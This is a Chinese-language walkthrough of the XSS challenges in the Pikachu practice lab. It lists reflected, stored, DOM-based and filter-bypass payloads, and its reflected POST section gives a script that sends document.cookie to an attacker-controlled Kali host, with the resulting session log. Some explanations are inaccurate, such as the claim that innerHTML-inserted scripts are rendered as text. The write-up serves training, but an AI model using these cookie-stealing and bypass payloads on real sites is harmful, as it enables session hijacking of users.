# Pikachu XSS




## 反射型xss(get)


### 輸入點:
```htmlembedded=
<form method="get">
  <input class="xssr_in" type="text" maxlength="20" name="message">
  <input class="xssr_submit" type="submit" name="submit" value="submit">
</form>
```



### 輸入1111出現:
`<p class="notice">who is 1111,i don't care!</p>`




### 塞不進輸入框，雖說是前端限制，可以BP修改。
```
<script>alert('xss')</script> 
```


### 但不用get型直接在URL 輸入就可
```
<script>alert('xss')</script>
```



## 反射性xss(post)

* 为了能够让你练习xss获取cookie,我们还是登陆一下,账号admin/123456





### 這題塞的進去而且是用POST 
```
<script>alert('xss')</script> 
```

* 題目說要獲取cookie 所以我們用類似DNS LOG 的方式。
### 我準備kali 然後
```
php -s 0.0.0.0:80
```
我的kali 是192.168.43.84


### 所以xss payload:




```
<script type="text/javascript">
	const url = 'http://192.168.43.84/';
	const cookies = document.cookie;
	fetch(url + cookies, {
	  method: 'GET',
	})
</script>
```


### 成功會看到

```
[Thu Aug 10 10:28:16 2023] 192.168.43.96:14071 [404]: GET /ant[uname]=admin;%20ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815;%20PHPSESSID=hlu0rocg1d9tpbr34alpll1ed6 - No such file or directory


```

## 存储型xss

儲存型直接可以觸發:
```
<script>alert('xss')</script>
```


## DOM型xss

### 找到輸入點 onlick = domxss()
```
<input id="button" type="button" value="click me!" onclick="domxss()">
```

### 搜尋domxss
```
<script>
  function domxss() {
    var str = document.getElementById("text").value;
    document.getElementById("dom").innerHTML = " < a href = '"+str+"' > what do you see ? < /a>";
  }
  //试试：'>
  < img src = "#"
  onmouseover = "alert('xss')" >
  //试试：' onclick="alert('xss')">,闭合掉就行
</script>
```




### 可以閉合但觸發不了
```
123'></a><script>alert('xxs')</script> 
```

```
1111111111'><script>alert('xxs')</script><a>  沒有被觸發


1111111111' onclick="alert('xss')"> 會觸發

1111111111'>123</a><img src = "#" onmouseover = "alert('xss')" > 會觸發

1111111111'>123</a><img src=x onerror=alert('XSS')> 會觸發
```



当用户输入特定的内容 ' onclick="alert('xss')"> 时，由于 onclick 属性被添加到 <a> 标签上，浏览器会将其解析为事件处理程序，以响应元素的点击事件。这种方式在用户与元素交互时会被触发，而不依赖于脚本的位置。

然而，当您尝试插入 `<script>` 标签时，由于浏览器的解析顺序和安全策略，这可能会导致脚本不被执行。脚本的执行通常会在浏览器解析到它的位置时发生，而在该位置之前解析的 DOM 元素可能已经被创建。

这就是为什么您尝试插入的` <script>` 标签中的脚本没有被触发的原因之一。然而，要注意的是，浏览器和安全性机制的行为可能因浏览器类型、版本、安全设置等而有所不同。





### 如果用 JS  寫入dom `<script>alert('1')</script>` 會被觸發嗎

如果您通过 JavaScript 将 `<script>alert('1')</script>` 写入 DOM，它不会被触发。浏览器在解析通过 JavaScript 动态添加到 DOM 中的内容时，通常会将 `<script>` 标签中的脚本当作纯文本对待，而不会执行其中的脚本代码。这是浏览器的一种安全策略，以防止恶意代码的注入和执行。

让我通过一个示例来说明这一点：

```javascript
// 获取一个 DOM 元素
var element = document.getElementById("myDiv");

// 设置其 innerHTML 为包含脚本的字符串
element.innerHTML = "<script>alert('1')</script>";
```

在这个示例中，虽然您将包含 `alert('1')` 的 `<script>` 标签写入了 DOM，但脚本不会被触发。浏览器会将整个 `<script>` 标签当作文本内容处理，而不会执行其中的 JavaScript 代码。

如果您希望在动态添加到 DOM 中的脚本生效，您需要使用其他方法，比如使用 `document.createElement` 创建一个新的 `<script>` 元素，然后将其添加到 DOM 中。不过，这种做法仍然需要谨慎，以避免安全风险。




## DOM型xss-x




### GET輸入點

```
<form method="get">
  <input id="text" name="text" type="text" value="">
  <input id="submit" type="submit" value="请说出你的伤心往事">
</form>
```





### 出現按鈕
```
<a href="#" onclick="domxss()">有些费尽心机想要忘记的事情,后来真的就忘掉了</a>
```


```
<script>

	function domxss() {
	    // 从 URL 查询参数获取参数值
	    var str = window.location.search;

	    //decode GET參數
	    var txss = decodeURIComponent(str.split("text=")[1]);
	    
	    // 替换 '+' 字符为空格
	    var xss = txss.replace(/\+/g, ' ');
	    
	    // 使用获取的参数值创建一个 <a> 元素并插入到 DOM 中
	    document.getElementById("dom").innerHTML = " <a href = '"+xss+"' > 就让往事都随风, 都随风吧 </a>";
	}

  //试试：'>
  < img src = "#"
  onmouseover = "alert('xss')" >
  //试试：' onclick="alert('xss')">,闭合掉就行
</script>
```




```
123'></a><script>alert('1')</script> 不會觸發，原因跟上面一樣


123'></a><img src=x onerror=alert('XSS')> 會觸發
```


## xss盲打


```
<form method="post">
  <textarea class="content" name="content"></textarea>
  <br>
  <label>你的大名：</label>
  <br>
  <input class="name" type="text" name="name">
  <br>
  <input type="submit" name="submit" value="提交">
</form>

```


### 輸入後根據提示，管理員登入後台介面就會彈。

由於是入庫的所以是儲存型


兩個輸入點都可以彈
```
<script>alert('1')</script>
```


## xss之过滤



```
<form method="get">
  <input class="xssr_in" type="text" name="message">
  <input class="xssr_submit" type="submit" name="submit" value="submit">
</form>
```



```
<script>alert('1')</script>

//别说这些'>'的话,不要怕,就是干!
```






```
<script字串被過濾了

雙寫繞不過，我感覺是正則貪婪匹配。
<<script>script>alert('1')<<script>/script>


大小寫繞過
<Script>alert('1')</Script>

```


### 看一下源碼:(果真是正則貪婪匹配。)
```
$message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']);

```




## xss之htmlspecialchars


```
 <form method="get">
  <input class="xssr_in" type="text" name="message">
  <input class="xssr_submit" type="submit" name="submit" value="submit">
</form>

```


### htmlspecialchars
```
htmlspecialchars(string,flags,character-set,double_encode)

flags 可選:

ENT_COMPAT - 默认。仅编码双引号。
ENT_QUOTES - 编码双引号和单引号。
ENT_NOQUOTES - 不编码任何引号。

```

`htmlspecialchars` 是一个用于在将文本插入HTML中时进行转义的函数。它将一些特殊字符转换为对应的HTML实体，以确保这些字符不会被解释为HTML代码，从而避免XSS攻击。

在默认情况下，`htmlspecialchars` 预定义的字符是：

- `&` 转换为 `&amp;`
- `<` 转换为 `&lt;`
- `>` 转换为 `&gt;`
- `"` 转换为 `&quot;`
- `'` 转换为 `&#039;`（或 `&apos;`，具体取决于浏览器和HTML版本）


### 那麼默认就可用單引號繞過

```
123'  onmouseover=alert('xss') style='1111
```


css讓a tag 佔滿整個頁面
```
position: absolute; top: 0; right: 0; bottom: 0; left: 0; width: 100%; height: 100%; background-color: blue; color: white; text-align: center; line-height: 100vh; text-decoration: none;
```
payload: 
```
123'  onmouseover=alert('xss') style='position: absolute; top: 0; right: 0; bottom: 0; left: 0; width: 100%; height: 100%; background-color: blue; color: white; text-align: center; line-height: 100vh; text-decoration: none;
```


## xss之href输出


```
<form method="get">
  <input class="xssr_in" type="text" name="message">
  <input class="xssr_submit" type="submit" name="submit" value="submit">
</form>
```

### 輸入:111111111111111
```
<a href="111111111111111"> 阁下自己输入的url还请自己点一下吧</a>
```




經過測試完全沒閉合，應該是htmlspecialchars  採用ENT_QUOTES - 编码双引号和单引号。




那麼就需要用到JS 偽協議

```
javascript:alert('xss')
```



可以在 <a> 标签的 href 属性和 <img> 标签的 src 属性中使用 "javascript:" URL 协议（JS 偽協議）来执行 JavaScript 代码。然而，这种做法通常被视为不安全的，因为它可能导致跨站脚本（XSS）攻击
```
<a href="javascript:alert('xss">Click me</a>
<img src="javascript:alert('xss')">

```



## xss之js输出





### 這題算蠻特殊的，沒想到還能這樣搞。

```
<form method="get">
  <input class="xssr_in" type="text" name="message">
  <input class="xssr_submit" type="submit" name="submit" value="submit">
</form>

```

```
輸入
111111111111111

書出
<p id="fromjs">无论如何不要放弃心中所爱..</p>
```


### 找到JS
```
<script>
  $ms = '111111111111111';
  if ($ms.length != 0) {
    if ($ms == 'tmac') {
      $('#fromjs').text('tmac确实厉害,看那小眼神..')
    } else {
      //            alert($ms);
      $('#fromjs').text('无论如何不要放弃心中所爱..')
    }
  }
</script>

```

這裡看看能否閉合<script>標籤

```
123'</script><script>alert('xss')</script>
```

